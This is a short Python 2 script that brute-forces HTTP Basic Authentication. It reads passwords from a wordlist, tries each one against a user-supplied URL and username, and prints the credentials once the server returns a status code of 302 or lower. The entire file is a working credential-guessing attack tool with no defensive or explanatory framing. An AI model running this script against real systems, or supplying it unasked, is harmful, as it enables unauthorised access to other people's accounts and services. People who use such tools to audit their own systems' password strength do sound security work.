import sys, requests

response = ""
def login(username, password, url):
	return (requests.get(url, auth=(username, password))).status_code
	
usage = """
    USAGE: """ + sys.argv[0] + """ [PATH TO WORDLIST]
"""	

if len(sys.argv) < 2:
	print(usage)
	exit()

wordlist = sys.argv[1]

url = raw_input("URL (include protocol [http://]): ")
username = raw_input("Username: ")

password = ""
access = False
with open(wordlist) as filename:
	for line in filename:
		password = line.strip()
		response = login(username, password, url)
		if response > 302:
			#access = False
			print(username + ":" + password + "\nresponse: " + str(response) + "\n")
		else:
			access = True
			break

if access:
	print("\nSUCCESS:")
	print(username + ":" + password + "\nresponse: " + str(response) + "\n")
else:
	print("Failed to find key...")
